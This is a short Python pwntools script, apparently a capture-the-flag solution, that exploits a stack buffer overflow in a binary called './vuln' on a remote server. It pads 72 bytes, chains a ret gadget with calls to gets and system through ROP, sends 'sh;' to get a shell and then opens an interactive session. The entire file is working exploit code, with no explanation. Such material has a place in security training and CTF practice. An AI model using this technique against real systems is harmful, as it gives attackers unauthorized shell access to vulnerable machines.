from pwn import *

context.binary = elf = ELF("./vuln")
#conn = elf.process()
conn = remote("34.91.196.38", 1337)
rop = ROP(elf)

payload = b"a"*72
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(elf.sym.gets)
payload += p64(elf.sym.gets)
payload += p64(elf.sym.system)

conn.sendline(payload)
conn.sendline(b"aaaa")
conn.sendline(b"sh;")
conn.interactive()
